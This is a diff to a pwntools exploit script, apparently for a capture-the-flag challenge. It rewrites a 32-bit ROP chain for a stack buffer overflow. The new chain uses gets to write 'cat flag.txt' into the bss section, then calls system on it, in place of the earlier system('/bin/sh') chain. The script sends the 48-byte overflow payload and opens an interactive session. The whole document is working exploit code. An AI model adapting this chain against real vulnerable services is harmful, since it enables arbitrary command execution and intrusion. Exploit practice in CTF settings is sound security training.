@@ -11,27 +11,24 @@ else:
     if args.GDB:
         gdb.attach(r)
 
-# From objdump, No PIE + ASLR
+# From GDB, No ASLR + PIE 
+gets_plt       = 0x08048250
 system_plt     = 0x080482a0
-shell          = 0x08049368 + 13
-exit_plt       = 0x080482b0
 pop_ret        = 0x080481f6
+bss            = 0x0804b044
 
-# Number of bytes to reach the return address on the stack, via DeBrujin de bruijn indices
+# Number of bytes to reach the return address on the stack
 OFFSET = 48
 
-# Stack layout
-# [bin/sh     ]
-# [ANY RETURN ] 
-# [system_plt ] system("bin/sh")
-# [padding    ]
-rop  = p32(system_plt) + p32(exit_plt) + p32(shell) 
+# Write "cat flag.txt" to bss via gets, then call system(bss)
+rop  = p32(gets_plt)   + p32(pop_ret)   + p32(bss)       # gets(bss) <- "cat flag.txt"
+rop += p32(system_plt) + p32(0xdeadbeef) + p32(bss)      # system(bss)
 payload = b'A' * OFFSET + rop
 
 # Trigger get_name()
 r.sendlineafter(b'> ', b'2')
 r.sendlineafter(b':', payload)
 
-
+# Program is currently executing gets(bss)
 r.sendline(b'cat flag.txt')   
 r.interactive()
